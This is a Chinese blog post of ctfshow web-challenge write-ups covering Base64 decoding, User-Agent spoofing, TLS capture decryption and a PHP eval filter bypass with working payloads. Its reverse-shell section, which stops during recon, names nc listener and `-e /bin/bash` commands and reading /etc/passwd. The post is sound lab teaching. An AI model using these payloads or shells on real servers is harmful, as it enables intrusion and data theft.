---
title: "web应用安全与防护WP"
description: "一些有关ctf的web题目"
image: /assets/web-security-wp/cover.jpg
date: 2026-10-21
categories:
  - 学习
tags:
  - CTF
  - Web
  - 网络安全
type: tech
---

## web应用安全与防护

::link-banner
---

banner: /assets/web-security-wp/banner.jpg
title: web应用安全与防护
description: 题目来源:ctfshow的web应用安全与防护
link: "https://ctf.show/challenges"
---

::

### 一、第一章

#### 1.Base64编码隐藏

入门题，右键看一下源代码，能看到base64解码，解码一下就好了

![image-20261009201204961](/assets/web-security-wp/image-20261009201204961.png)

![image-20261009201219910](/assets/web-security-wp/image-20261009201219910.png)

---

#### 2.HTTP头注入

还是查看源代码

correctPassword - ->正确密码

![image-20261009204913230](/assets/web-security-wp/image-20261009204913230.png)

base64解码得到

```
CTF{easy_base64}
```

输入密码得到

![image-20261009205059546](/assets/web-security-wp/image-20261009205059546.png)

“你必须使用名为 **ctf-show-brower** 的浏览器才能访问此页面。”

“User Agent”- - >我们要去对UA进行修改

> Q1：为什么要去对UA进行修改？
>
> **UA = User-Agent，是 HTTP 请求头里，客户端发给服务器的 “自我介绍名片”，告诉服务器：我是什么浏览器 / 客户端**。
> 这道题后端写了判断代码：**读取请求里的 User-Agent 头，必须等于 `ctf-show-brower`，才放行页面；不等于，直接输出提示：你必须使用名为 ctf-show-brower 的浏览器才能访问此页面**。
>
> 后端 PHP 逻辑，这题大概是这样写的：
>
> ```
> // 伪代码
> $ua = $_SERVER['HTTP_USER_AGENT'];
> if($ua !== "ctf-show-brower"){
>     echo "你必须使用名为 ctf-show-brower 的浏览器才能访问此页面。";
>     exit;
> }
> // 校验通过，输出页面/flag
> ```
>
> 服务器只看 UA 头这串文字，**不校验你真实用什么浏览器**，UA 头是我们可以随便修改的请求头。
>
> | 名词             | 含义                                                         |
> | ---------------- | ------------------------------------------------------------ |
> | UA / User-Agent  | 请求头，客户端身份标识，浏览器、curl 发包都会带上            |
> | 请求头（Header） | HTTP 包最前面的一堆键值对（Host、User-Agent、Cookie 都属于 header） |

##### 打开Burp进行抓包

![image-20261009205238918](/assets/web-security-wp/image-20261009205238918.png)

ctrl+R，发送到Repeater，找到UA

![image-20261009205456135](/assets/web-security-wp/image-20261009205456135.png)

修改成

```
User-Agent: ctf-show-brower
```

![image-20261009205547314](/assets/web-security-wp/image-20261009205547314.png)

点击send，查看响应就能找到flag

![image-20261009205612623](/assets/web-security-wp/image-20261009205612623.png)

进行提交就能通过了

---

#### 3.Base64多层嵌套解码

##### 3.1查看源码

![image-20261011093038193](/assets/web-security-wp/image-20261011093038193.png)

```
   document.getElementById('loginForm').addEventListener('submit', function(e) {
            const correctPassword = "SXpVRlF4TTFVelJtdFNSazB3VTJ4U1UwNXFSWGRVVlZrOWNWYzU=";
            
            function validatePassword(input) {
                let encoded = btoa(input);
                encoded = btoa(encoded + 'xH7jK').slice(3);
                encoded = btoa(encoded.split('').reverse().join(''));
                encoded = btoa('aB3' + encoded + 'qW9').substr(2);
                return btoa(encoded) === correctPassword;
            }

            const enteredPassword = document.getElementById('password').value;
            const messageElement = document.getElementById('message');
            
            if (!validatePassword(enteredPassword)) {
                e.preventDefault();
                messageElement.textContent = "Login failed! Incorrect password.";
                messageElement.className = "message error";
            }
        });
```

###### (1)`function validatePassword(input) {`

- 定义校验函数，`input` 就是输入的密码原文。

###### (2)`let encoded = btoa(input);`

- 把输入的原始密码 `input`，直接做一次 Base64 编码，赋值给`encoded`。

###### (3)`encoded = btoa(encoded + 'xH7jK').slice(3);`

- 在第 1 层结果**末尾拼接固定字符串 `xH7jK`**
- 对拼接完的整体，再做一次 Base64
- `.slice(3)`：**砍掉前 3 个字符**，剩下的作为新 encoded

###### (4)`encoded = btoa(encoded.split('').reverse().join(''));`

- `.split('')`：字符串切成单个字符数组
- `.reverse()`：**反转字符顺序**（"abcd" → "dcba"）
- `.join('')`：数组拼回字符串
- 反转后的字符串再做一次 Base64

###### (5)`encoded = btoa('aB3' + encoded + 'qW9').substr(2);`

- 在(4)结果**前面加固定前缀`aB3`、后面加固定后缀`qW9`**
- 整体 Base64 编码
- `.substr(2)`：**砍掉前 2 个字符**

###### (6)`return btoa(encoded) === correctPassword;`

- 对上一层的结果，**再做一次 Base64**
- 判断最终字符串是否等于 `correctPassword`
- 返回 true = 密码正确；false = 错误

从 `correctPassword` 往回剥，每层的逆操作：

| 正向（加壳）                      | 逆向（剥壳）                                                 |
| --------------------------------- | ------------------------------------------------------------ |
| `btoa(encoded)`                   | base64 解码                                                  |
| `'aB3'+...+'qW9'` 后 `substr(2)`  | 前面补回 2 字符 `YU` 再解码（`'YUIz'` 正是 `'aB3'` 的 base64），剥掉头 `aB3`、尾 `qW9` |
| `reverse()` 后 `btoa`             | base64 解码后把字符串**反转**回来                            |
| `encoded + 'xH7jK'` 后 `slice(3)` | 砍掉的 3 个字符丢了 → **只能爆破**                           |
| `btoa(input)`                     | base64 解码 = 口令                                           |

**为什么第 2 层要爆破**：`slice(3)` 砍掉的是当时 base64 串的前 3 个字符，信息已丢失。枚举 base64 字符集的 64³ = 262144 种 3 字符组合，补到串前面再解码，**解码结果以 `xH7jK` 结尾**的就是命中；切掉尾巴再解一层就得到口令。总共几秒钟跑完。

##### 3.2运行脚本获取flag

创建一个`solve.py`,写入代码

```
import base64
import itertools
import re
import string
import sys
import ssl
import urllib.parse
import urllib.request

# 公开 writeup 里这道题的 correctPassword（用于离线自检）
KNOWN_CP = "SXpVRlF4TTFVelJtdFNSazB3VTJ4U1UwNXFSWGRVVlZrOWNWYzU="


def b64e(s: str) -> str:
    """等价 JS btoa：字符串 -> base64"""
    return base64.b64encode(s.encode('latin-1')).decode()


def b64d(s: str) -> str:
    """等价 JS atob：base64 -> 字符串（自动补齐 = ）"""
    s = s + '=' * (-len(s) % 4)
    return base64.b64decode(s).decode('latin-1')


def forward(pw: str) -> str:
    """照抄页面 JS 的完整编码链，用于验证候选口令"""
    e = b64e(pw)                          # 1. btoa(input)
    e = b64e(e + 'xH7jK')[3:]             # 2. 拼 xH7jK 后 btoa，砍掉前 3 字符
    e = b64e(e[::-1])                     # 3. 反转后 btoa
    e = b64e('aB3' + e + 'qW9')[2:]       # 4. 加 aB3/qW9 前后缀后 btoa，砍掉前 2 字符
    return b64e(e)                        # 5. 再 btoa，与 correctPassword 比对


def recover(cp: str, limit: int = 40):
    """由 correctPassword 逐层反推可用的口令候选"""
    e4 = b64d(cp)                             # 逆第 5 层
    s = b64d('YU' + e4)                       # 逆第 4 层：补回被砍的 2 字符（'YUIz' 是 'aB3' 的 base64）
    assert s.startswith('aB3') and s.endswith('qW9'), f"第4层结构不符: {s[:12]!r}...{s[-12:]!r}"
    e3 = s[3:-3]
    e2 = b64d(e3)[::-1]                       # 逆第 3 层：解 base64 再反转回来
    # 逆第 2 层：被砍掉的 3 个字符无法直接还原，暴力枚举 base64 字符集，
    # 找出解码后以 'xH7jK' 结尾的候选，砍掉 'xH7jK' 再解第 1 层即得口令
    alphabet = string.ascii_letters + string.digits + '+/'
    found = []
    for tup in itertools.product(alphabet, repeat=3):
        p = ''.join(tup)
        try:
            txt = b64d(p + e2)
        except Exception:
            continue
        if not txt.endswith('xH7jK'):
            continue
        try:
            pw = b64d(txt[:-5])
        except Exception:
            continue
        # 只留可打印 ASCII，并用正向链独立验证
        if all(32 <= ord(c) < 127 for c in pw) and pw not in found and forward(pw) == cp:
            found.append(pw)
            if len(found) >= limit:
                break
    return found


def attack(base: str):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    page = urllib.request.urlopen(base + '/', context=ctx, timeout=20).read().decode('utf-8', 'replace')
    m = re.search(r'correctPassword\s*=\s*"([^"]+)"', page)
    if not m:
        print('[!] 页面里没找到 correctPassword（可能不是这道题的应用）')
        return
    cp = m.group(1)
    print('[1] 抓到 correctPassword =', cp)
    if 'validatePassword' not in page:
        print('[!] 页面里没有 validatePassword —— 这不是「Base64多层嵌套解码」的应用页面')
    try:
        cands = recover(cp)
    except AssertionError as e:
        print(f'[!] correctPassword 不是多层嵌套结构（{e}）')
        print('[!] 判定：该容器当前运行的不是本题，请到「Base64多层嵌套解码」题目卡片重新创建容器')
        return
    print(f'[2] 反推出 {len(cands)} 个可用口令，例如:')
    for c in cands[:5]:
        print('     ', repr(c))
    if not cands:
        return
    pw = cands[0]
    req = urllib.request.Request(
        base + '/check.php',
        data=urllib.parse.urlencode({'username': 'admin', 'password': pw}).encode(),
        headers={'User-Agent': 'ctf-show-brower'},   # 这道题仍要求专用 UA
    )
    resp = urllib.request.urlopen(req, context=ctx, timeout=20).read().decode('utf-8', 'replace')
    msg = re.search(r'<div class="message[^"]*">([^<]*)', resp)
    flag = re.search(r'CTF\{[^}]+\}', resp)
    print('[3] 服务端返回:', msg.group(1).strip() if msg else resp[:200])
    if flag:
        print('[4] FLAG =', flag.group(0))


if __name__ == '__main__':
    if len(sys.argv) > 1:
        attack(sys.argv[1].rstrip('/'))
    else:
        print('=== 离线自检：用公开 writeup 的 correctPassword 反推口令 ===')
        cands = recover(KNOWN_CP)
        print(f'共找到 {len(cands)} 个可用口令:')
        for c in cands[:20]:
            print('  ', repr(c), ('   <-- 含 7316（writeup 实测可用）' if '7316' in c else ''))

```

然后在终端运行，得到flag

```
python solve.py https://b462fa0e-368d-4172-83bd-f941c8c177a9.challenge.ctf.show
```

![image-20261011095637822](/assets/web-security-wp/image-20261011095637822.png)



---

#### 4.HTTPS中间人攻击

「HTTPS中间人攻击」两个关键词：

- HTTPS → 内容是 TLS 加密的
- 中间人 → 能看到流量但读不懂。预示考点是"加密流量怎么变明文"。

- 附件 `target..pcap`：`.pcap` 是 packet capture（抓包）的通用格式，看到 `.pcap / .pcapng / .cap` 直接联想 Wireshark/tshark。
- 解题思路：打活的 web 题用 Burp，分析流量包用 Wireshark，看二进制用 010）。

密钥类型	作用
EXPORTER_SECRET	==TLS== 扩展导出密钥，Wireshark 解密 HTTPS 一般不用
SERVER_HANDSHAKE_TRAFFIC_SECRET	解密服务端握手阶段加密报文
SERVER_TRAFFIC_SECRET_0	解密服务端业务数据（网页响应、接口返回）
CLIENT_HANDSHAKE_TRAFFIC_SECRET	解密客户端握手阶段加密报文
CLIENT_TRAFFIC_SECRET_0	解密客户端业务数据（浏览器 ==POST==、请求头）

![image-20261011202210377](/assets/web-security-wp/image-20261011202210377.png)

##### 4.1打开Wireshark，点击编辑，再点击首选项（或使用快捷键`ctrl+shift+P`

![image-20261011205028079](/assets/web-security-wp/image-20261011205028079.png)

##### 4.2点击Protocols

![image-20261011205544116](/assets/web-security-wp/image-20261011205544116.png)

##### 4.3往下翻找，找到TLS

![image-20261011205701918](/assets/web-security-wp/image-20261011205701918.png)

##### 4.4 (Pre)-Master-Secret log filename，填`sslkey.log` 的完整路径，确定。

![image-20261011205842262](/assets/web-security-wp/image-20261011205842262.png)

##### 4.5开始抓包

###### （1）文件 → 打开 → `target..pcap`。

![image-20261011210400955](/assets/web-security-wp/image-20261011210400955.png)

###### （2）然后会进入到这个界面，右键POST请求的那行

![image-20261011210921005](/assets/web-security-wp/image-20261011210921005.png)

然后就能在`POST /` 请求体里看到flag

![image-20261011211057358](/assets/web-security-wp/image-20261011211057358.png)

---

### 第二章

#### 1.一句话木马变形

##### 1.1先看源码

```
curl.exe -s "https://a50f6b4a-....challenge.ctf.show/"
```

![image-20261017104219552](/assets/web-security-wp/image-20261017104219552.png)

- 只有一个入口：POST `code` 字段
- 它说"Enter PHP Code" → **后端大概率是 `eval($_POST['code'])` 之类**

##### 1.2测过滤边界

使用powershell，输入

```
$B = "<你的实例地址>"
$chars = '$','/','.','''','"','[',']','{','}','*','>','<','|','&','+','-',' ','@','#','%','^','~',':',',','\','?','='
foreach ($c in $chars) {
    $code = "a${c}a;"
    $raw  = & curl.exe -s --max-time 25 -X POST $B --data-urlencode "code=$code"
    $t = ($raw -join "`n")
    if ($t -match 'Invalid characters') { $v = 'BANNED ' } else { $v = 'ALLOWED' }
    Write-Output ("[{0}] {1}" -f $c, $v)
}
```

实测结果：

![image-20261017164539057](/assets/web-security-wp/image-20261017164539057.png)

```
字母 数字 _(下划线) ( ) ;        →  ALLOWED（允许）
$ / . ' " [ ] { } * > < | & + -   →  BANNED（禁止）
空格 @ # % ^ ~ : , \ ? =          →  BANNED（禁止）
```

**结论**：白名单只有 **5 类**：**字母、数字、下划线 `_`、圆括号 `(` `)`、分号 `;`**。

##### 1.3用 `phpinfo()` 侦察

**为什么不是别的函数？**

| 想法            | 为什么不行 / 为什么不如 `phpinfo()`                   |
| --------------- | ----------------------------------------------------- |
| `print("...")`  | 要引号 → **被禁**                                     |
| `system("ls")`  | 要引号 → **被禁**（而且只回答"有哪些文件"这一个问题） |
| `getcwd()`      | 合法，但**只回答 1 个问题**（当前目录）               |
| **`phpinfo()`** | **零参数、零引号，一次回答 5 个问题**                 |

> PHP 用 `phpinfo()`；Linux 命令执行用 `id; whoami; pwd; ls`；Windows 用 `whoami; systeminfo`；
> SQL 注入用 `database(); version();`……它们回答的是**同一类问题：版本 / 身份 / 位置 / 环境**。

**命令：**

```
$B = "<你的实例地址>"
function Run($c) {
    $r = & curl.exe -s --max-time 30 -X POST $B --data-urlencode "code=$c"
    $t = ($r -join "`n")
    if ($t -match '(?s)<div class="result">(.*?)</div>\s*</div>') { $m = $Matches[1] } else { $m = $t }
    $m = [System.Net.WebUtility]::HtmlDecode($m)
    $m = $m -replace '<br\s*/?>', "`n"
    $m = $m -replace '<[^>]+>', ''
    $m = [System.Net.WebUtility]::HtmlDecode($m)
    ($m -replace ([char]0xA0), ' ').Trim()
}
Run "phpinfo();"
```

**你会看到：**

```
PHP Version 7.3.29                          <- 版本
USER                www-data
DOCUMENT_ROOT       /var/www/html
$_SERVER['FLAG']    not_flag                 
$_ENV['FLAG']       not_flag                 
```

**解释**：

- **PHP 7.3.29** → 这个版本号极其重要，见 Step 4。
- **www-data** → 服务器给你的是低权限用户，只能读、不能写系统。
- **`FLAG = not_flag`** →  `print(getenv(FLAG));` → `not_flag`。
	→ **放弃"读环境变量"这条路，转去读文件。**

| 你想要            | 在 phpinfo 里搜这个关键词 | 想直接拿到就写这行                   |
| ----------------- | ------------------------- | ------------------------------------ |
| 版本              | `PHP Version`             | `print(phpversion());`               |
| 运行用户          | `USER`                    | `print(get_current_user());`         |
| 站点根目录        | `DOCUMENT_ROOT`           | `print(getcwd());`                   |
| 环境变量里的 flag | `FLAG`                    | `print_r(getenv());`                 |
| 被禁用的函数      | `disable_functions`       | `print(ini_get(disable_functions));` |
| 目录限制          | `open_basedir`            | `print(ini_get(open_basedir));`      |

##### 1.4钥匙：PHP 7.3 的「未定义常量回退」

**目的**：解决"没有引号怎么造字符串"。

**命令：**

```
Run "print(hello);"
```

**你会看到：**

```
Warning: Use of undefined constant hello - assumed 'hello' (this will throw an Error in a future version of PHP)
hello
```

![image-20261017170706924](/assets/web-security-wp/image-20261017170706924.png)

PHP **7.3 及更早版本**有个历史行为——

> 代码里写一个**没定义过的裸单词**，PHP 会把它**当成字符串**，值就是它自己的名字，只发个 Warning 而已。

**结论**：**不能用引号？那就直接写裸词，它自带引号效果。**

**这一步等于同时解开两把锁：**

1. 字符串有来源了（`flagphp` → 字符串 `"flagphp"`）
2. **函数名/命令名也能当字符串参数传**（比如 `system(ls)` 里的 `ls`）

##### 1.5拿到 RCE，然后撞墙

**命令：**

```
Run "system(id);"
Run "system(ls);"
```

**你会看到：**

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```
flag.php
index.php
```

![image-20261017170955859](/assets/web-security-wp/image-20261017170955859.png)

`system("ls")` 就是让服务器列当前目录 → 看到 **`flag.php`** 和 `index.php`。**RCE 到手。**

**接下来撞墙：**

```
Run "show_source(flag.php);"
```

```
Error: Invalid characters detected! Only letters, numbers, underscores ,parentheses and semicolons are allowed.
```

`flag.php` 中间那个 **`.` 是被禁字符**。

**于是处境是**：**「我能执行命令，但我打不出一个带点的文件名。」**

##### 1.7不"手写"文件名，改成"让函数生成"

> **既然我打不出 `flag.php`，那我就不写它。让 PHP 自己去目录里，把这个字符串"捞"出来。**

###### (1)我在哪个目录？

```
Run "print(getcwd());"
```

```
/var/www/html
```

![image-20261018193705046](/assets/web-security-wp/image-20261018193705046.png)

###### (2)目录里有什么？

```
Run "print_r(scandir(getcwd()));"
```

![image-20261018193756041](/assets/web-security-wp/image-20261018193756041.png)

> `scandir` = 扫描目录、返回文件名数组。

###### (3)把数组反转，让目标挪到第 2 格

```
Run "print_r(array_reverse(scandir(getcwd())));"
```

![image-20261018193930637](/assets/web-security-wp/image-20261018193930637.png)

###### (4)用"数组指针"把第 2 格取出来：

```
Run "print(next(array_reverse(scandir(getcwd()))));"
```

![image-20261018194413871](/assets/web-security-wp/image-20261018194413871.png)

**为什么非要用 `array_reverse` + `next`，不直接写 `scandir(...)[2]`？**

不是"不想直接取"，而是**"直接取"这条路被白名单一层层堵死了**：

1. **下标 `[2]`**：`[` `]` 被禁 → 打不出来。
2. **指针函数**：`current()` 停在第一格 = `.`；`next()` 一次只挪一格 → 够不到第 3 格的 `flag.php`。
3. **连点两次 `next(next(...))`**：`next()` 返回的是**那一格的值（字符串）**，不是数组 → 外面再套 `next` 变成"对字符串 next"，报错。
4. **存进变量再连挪**：`$a = scandir(...); next($a); next($a);` → **`$` 被禁**，存不了变量。
5. **换别的"直接"函数**（如 `array_slice(scandir(...), 2, 1)`）：参数之间要**逗号**，而 **`,` 也被禁**。

**既然"把指针移向目标"条条不通，就反过来——"把目标移到指针够得着的地方"。**

> 指针从第 1 格起步，`next()` 能稳稳够到的就是**第 2 格**。于是用 `array_reverse` 把整个数组倒过来，让 `flag.php` 正好落在第 2 格
>
> 指针函数只能"相对移动"：
>
> | 函数        | 作用                   |
> | ----------- | ---------------------- |
> | `current()` | 看**当前**那格（不动） |
> | `next()`    | 往后挪一格，返回新格子 |
> | `prev()`    | 往前挪一格             |
> | `end()`     | 跳到最后一格           |
> | `reset()`   | 跳回第一格             |
>
> 输出函数的"三兄弟":
>
> | 函数       | 用来打印    | 特点                                                   |
> | ---------- | ----------- | ------------------------------------------------------ |
> | `print`    | 字符串/数字 | 给它**数组只会显示 `Array` 三个字**，内容全丢失        |
> | `echo`     | 字符串/数字 | 和 `print` 几乎一样（能一次打多个，`print` 不行）      |
> | `print_r`  | 数组/对象   | 结构化、带键名，最好读（本步用的就是它）               |
> | `var_dump` | 任意        | 还显示**类型和长度**（如 `string(3) "abc"`），信息最全 |

###### （5）读"源码"

**命令：**

```powershell
Run "show_source(next(array_reverse(scandir(getcwd()))));"
```

![image-20261018195020014](/assets/web-security-wp/image-20261018195020014.png)

得到flag

---

#### 2.反弹shell构造

##### 2.1访问网址

![image-20261020125130875](/assets/web-security-wp/image-20261020125130875.png)

输入 `whoami`，点执行 —— 页面显示：

```
execute success!
```

![image-20261020125212676](/assets/web-security-wp/image-20261020125212676.png)

**只回显`execute success!`命令的执行结果没出现。**

所以这个很可能考察**盲执行**：命令跑了，但看不到结果。

> **Q1:什么是盲执行：**
>
> **你的命令在目标服务器上执行了，但是服务器不会把命令执行的结果直接返回给页面回显，你看不到输出**，就叫盲执行（盲命令注入）。
>
>
> 普通命令注入：普通注入会直接把 `id`、`ls` 的结果打印在网页上；盲执行页面内容不变，没有输出回显。

这类"没有回显"的场景，经典解法是**反弹 shell**——
让靶机主动连回你的机器，把命令行交给你。

有三条路线：

| 路线                   | 一句话                           | 需要什么               |
| ---------------------- | -------------------------------- | ---------------------- |
| **复制文件到网站目录** | 把结果写成网页文件，再用浏览器读 | 网站目录可写           |
| **webhook 外带**       | 让靶机把结果"寄"到你建的公网信箱 | 靶机能出网             |
| **反弹 shell**         | 让靶机主动连回你，给你一个终端   | 你有公网 IP / 内网穿透 |

下面是一些解释，可看可不看：

###### （1）命令执行（Command Execution）

> **Q2：什么是命令执行？**
>
> 网页把用户输入的内容，直接当成**操作系统命令**去跑。
>
> ```
> 你输入：whoami
> 服务器实际执行：whoami
> ```
>
> 常见于 PHP 的这些函数：
>
> | 函数                | 特点                         |
> | ------------------- | ---------------------------- |
> | `system()`          | 执行命令，并**直接输出**结果 |
> | `exec()`            | 执行命令，返回最后一行       |
> | `shell_exec()`      | 执行命令，**返回完整输出**   |
> | `passthru()`        | 执行并输出原始二进制         |
> | 反引号 `` `命令` `` | 等价于 `shell_exec`          |
>
> PS：攻击者能执行 `whoami`，就能执行 `cat /etc/passwd`等命令。
>
> > PS：
> >
> > - **命令执行**：跑的是系统命令（`ls`、`cat`）。
> > - **代码执行**：跑的是程序代码（PHP 的 `eval`）。
> > 	两者都能拿服务器，但入口不一样。

###### （2）盲执行（Blind RCE）

> 命令**执行了**，但看不到结果。
>
> 这有两种可能：
>
> | 可能                           | 现象                         | 对策         |
> | ------------------------------ | ---------------------------- | ------------ |
> | ① 命令**没执行**（假输入框）   | 发 `sleep 5` 页面不卡        | 换方向       |
> | ② 命令**执行了，但输出被丢弃** | 发 `sleep 5` 页面**卡 5 秒** | **带外通道** |
>
> **判别方法**：发一条"纯副作用"命令 `sleep 5`。
> 它什么也不输出，只会让程序等 5 秒。
>
> > 页面卡了 5 秒 = 命令在跑 = 属于第 ② 种 = 本题方向确认。

###### （3）带外通道（OOB，Out-Of-Band）

> 不用**网页响应**传数据，而是**另开一条通道**把数据运出来。
>
> 有三种方法：
>
> | 通道      | 例子                         |
> | --------- | ---------------------------- |
> | HTTP 请求 | 靶机 `curl` 一个你能读的网址 |
> | DNS 请求  | 靶机查一个你能看日志的域名   |
> | 反向连接  | 靶机主动连回你（反弹 shell） |
>

###### （4）名词解释

> | 名词                                | 人话解释                                                     |
> | ----------------------------------- | ------------------------------------------------------------ |
> | **RCE**                             | Remote Code Execution，远程代码/命令执行。泛指"能在别人机器上跑东西"。 |
> | **命令执行**                        | 服务器把用户输入当**系统命令**跑（`whoami`、`ls`）。         |
> | **`shell_exec()`**                  | PHP 函数：跑一条系统命令，并把输出作为字符串返回。==本题漏洞点==。 |
> | **盲执行 / 盲 RCE**                 | 命令跑了，但结果**不显示给攻击者**。                         |
> | **回显**                            | 命令结果直接显示在页面上。                                   |
> | **带外通道（OOB）**                 | 不走原响应，另开一条路把数据运出来。                         |
> | **反弹 shell**                      | 让**靶机主动连回你**，把命令行交给你用。                     |
> | **正向 shell**                      | 靶机开端口等你连。靶机在内网，通常连不上。                   |
> | **监听端（listener）**              | 你这边"等电话"的程序，如 `nc -lvnp 4444`。                   |
> | **`nc`（netcat）**                  | 网络瑞士军刀：能连、能听、能传数据。传统版支持 `-e`。        |
> | **`-e /bin/bash`**                  | nc 参数：连上后把 `/bin/bash` 接到这条连接上 → 对方能敲命令。 |
> | **`$()`**                           | Linux 命令替换：把括号里命令的**输出**当==文本==用。如 `$(id)`。 |
> | **`2>&1`**                          | 把**标准错误**合并进**标准输出**（否则报错信息会丢）。       |
> | **webhook**                         | "网络钩子"。本题用 webhook.site 的**请求收集**功能，当"公网信箱"。 |
> | **request bin**                     | 请求收集箱：给你一个 URL，谁访问、发了什么都能回读。         |
> | **Docker 容器**                     | 靶机跑在容器里，`/` 下有 `.dockerenv` 是标志。               |
> | **`ob_start()` / `ob_get_clean()`** | PHP 输出缓冲：开始/结束"接住"输出。                          |
> | **php-fpm**                         | PHP 的运行方式，前面通常有 nginx 反代。                      |
> | **webroot**                         | 网站根目录。本题是 `/var/www/html`，放进去的文件能通过 URL 访问。 |
> | **OAST**                            | 带外应用安全测试，专打"盲漏洞"的一套方法。                   |
> | **payload**                         | 载荷：真正发给目标、让它执行的那段内容。                     |
> | **NAT**                             | 家用路由器把多台设备共享一个公网 IP，外面主动连不进来。      |
>

##### 2.2信息搜集

###### 五步侦察法

> 命令都在 PowerShell 里跑，`<URL>` 换成当前实例地址。

（1）确认实例活着 + 看服务指纹

```
curl.exe -s -D - -o NUL --max-time 25 "<URL>"
```

![image-20261020135243115](/assets/web-security-wp/image-20261020135243115.png)

> | 单词 / 符号  | 含义                          | 作用说明                                                     |
> | ------------ | ----------------------------- | ------------------------------------------------------------ |
> | `curl.exe`   | curl 可执行程序（Windows 版） | 发起 HTTP/HTTPS 请求的命令行工具，`.exe` 后缀表明运行在 Windows 上 |
> | `-s`         | silent（静默）                | 隐藏进度条和错误信息，只输出请求结果，减少干扰               |
> | `-D`         | dump-header（导出响应头）     | 把服务器返回的 **HTTP 响应头** 单独导出                      |
> | `-`          | 标准输出 stdout               | `-D` 后面的 `-` 表示把响应头打印到屏幕（标准输出），而不是写入文件 |
> | `-o`         | output（输出）                | 指定请求体 / 响应体的保存位置                                |
> | `NUL`        | Windows 空设备                | 相当于 Linux 的 `/dev/null`，把响应体直接丢弃，不写入任何真实文件 |
> | `--max-time` | 最大超时时间（秒）            | 整个请求最多等待的时间，防止卡死                             |
> | `25`         | 25 秒                         | 超时上限：请求超过 25 秒没完成就强制结束                     |
> | `"<URL>"`    | 目标网址占位符                | 实际使用时替换成你要请求的完整地址，双引号包裹避免空格 / 特殊字符被解析 |
>
> **整条命令的效果**：向 `<URL>` 发起请求，把**响应头**打印在屏幕（`-D -`），把**响应体**丢弃（`-o NUL`），最多等 25 秒（`--max-time 25`），全程静默不显示进度（`-s`）。常用于**只关心响应头、不看页面内容**的探测场景（如判断服务器状态码、头字段、是否重定向等）。
>
> Q1：“`-`标准输出 stdout”不加会怎么样？
>
> 如果你只写 `-D`、**不写后面这个 `-`**，命令直接报错，curl 会认为缺少参数。
>
> | 写法                              | 结果             | 说明                                                         |
> | --------------------------------- | ---------------- | ------------------------------------------------------------ |
> | `-D -`                            | 正常             | 响应头打印到控制台；响应体丢 NUL。                           |
> | 只写`-D`（后面空着，去掉 `-`）    | 报错             | `-D`需要文件名，缺少参数，curl 直接退出，不发起请求          |
> | `-D header.txt`（换成普通文件名） | 执行，但行为变了 | 响应头**保存到本地文件 header.txt**，**不会在屏幕打印**；你控制台看不到响应头，需要去打开文件看 |
>
> - `-D -`：**响应头 → 输出到屏幕**
> - `-o NUL`：**响应体（网页正文） → 直接丢弃，不输出**
>
> 如果你写成 `curl.exe -s -D -o NUL ...` （把`-`删掉）
> curl 会解析成：`-D` 的参数是 `-o`，它尝试把响应头写入一个名叫 `-o` 的文件，然后 `NUL` 被当成目标 URL。
>
> **Q2:为什么是`NUL`而不是`NULL`？**
>
> **Windows CMD/PowerShell 里空设备名字是 `NUL`；`NULL` 不是设备名，只是编程里的空指针常量。**
>
> | 名词     | 场景                     | 含义                                          |
> | -------- | ------------------------ | --------------------------------------------- |
> | **NUL**  | Windows 命令行，特殊设备 | 空设备，丢弃输出。类似 Linux 的 `/dev/null`   |
> | **NULL** | C/C++/Python 等编程语言  | 空指针，表示 “什么都不指向”，**不是系统设备** |
>
> > 原理：把输出重定向到 `NUL` = 发给一个不存在的虚拟设备，数据直接扔掉，不存盘、不打印。
> >
> > - `NUL`：操作系统设备（命令行用）
> > - `NULL`：编程语言常量（代码里用）
>
> **Q3:如果你写成 `-o NULL` 会发生什么？**
> curl 会理解为：**把响应体保存到一个名叫 `NULL` 的文件**，不是丢弃。
>
> - 会在当前文件夹生成一个真实文件 `NULL`
> - 内容是网页响应体
> - 达不到我们想要 “扔掉响应体” 的目的
>
> > ==注意：==
> >
> > Linux 没有 NUL，Linux 丢弃输出用 `/dev/null`。
>

实测：

```
HTTP/1.1 200 OK
Server: nginx/1.20.1                 ← 前端 
Content-Type: text/html; charset=UTF-8
```

- 返回 `200` → 可以继续。
- 返回 `404` → 实例过期，回平台重开。

![image-20261020135243115](/assets/web-security-wp/image-20261020135243115.png)

 （2）存下完整 HTML，找"输入点"

```
curl.exe -s "<URL>" -o page.html
Select-String -LiteralPath page.html -Pattern "form|textarea|input|name=|action="
```

> | 内容      | 含义               | 说明                                                         |
> | --------- | ------------------ | ------------------------------------------------------------ |
> | curl.exe  | 程序名             | Windows 自带的命令行下载 / 请求工具，用来发送 HTTP 请求拿网页内容 |
> | -s        | 参数（--silent）   | 静默模式，**不输出进度条、错误提示**，只拿页面内容，干净     |
> | "<URL>"   | 你要访问的目标网址 | 比如 `"http://127.0.0.1/index.php"`，引号包裹防止地址里特殊符号出错 |
> | -o        | 参数（--output）   | output 输出，指定把拿到的内容**写入文件**，而不是直接打印到屏幕 |
> | page.html | 输出保存的文件名   | 网页源码存到当前文件夹下的 page.html                         |
>
> >
> > Select-String = PowerShell 里面的「文本搜索工具」≈ Linux 里的 grep
>
> | 内容                                    | 含义            | 说明                                                         |
> | --------------------------------------- | --------------- | ------------------------------------------------------------ |
> | Select-String                           | PowerShell 命令 | 用来在文件里**匹配、查找指定字符串**                         |
> | -LiteralPath                            | 参数            | 字面路径；后面跟着要搜索的文件，不会把 *、[] 当成通配符（安全匹配文件名） |
> | page.html                               | 目标文件        | 刚刚 curl 下载下来的网页源码文件，我们要在这个文件里面搜索   |
> | -Pattern                                | 参数            | 后面跟**匹配规则（正则）**                                   |
> | "form\|textarea\|input\|name=\|action=" | 正则匹配串      | ` 在正则里代表 **或** 意思：只要包含任意一个就匹配出来：form **或者** textarea **或者** input **或者** name= **或者** action= |
>
> 1. **curl.exe**：http 客户端工具，发起网络请求，获取网页源代码
> 2. **-s（silent）**：安静模式，关掉下载进度、无关提示
> 3. **-o（output）**：输出到文件
> 4. **Select-String**：powershell 自带文本检索命令，查找文件里符合规则的行
> 5. **-LiteralPath**：字面路径参数，告诉程序：后面是文件名，不要解析通配符
> 6. **-Pattern**：匹配模板 / 正则模式，写你想要搜什么内容
> 7. `form`：HTML 表单标签 `<form>`，CTF 重点（提交数据的容器）
> 8. `textarea`：多行输入框标签
> 9. `input`：输入标签（前面刚学的！）
> 10. `name=`：标签里的 name 属性，表单提交必备
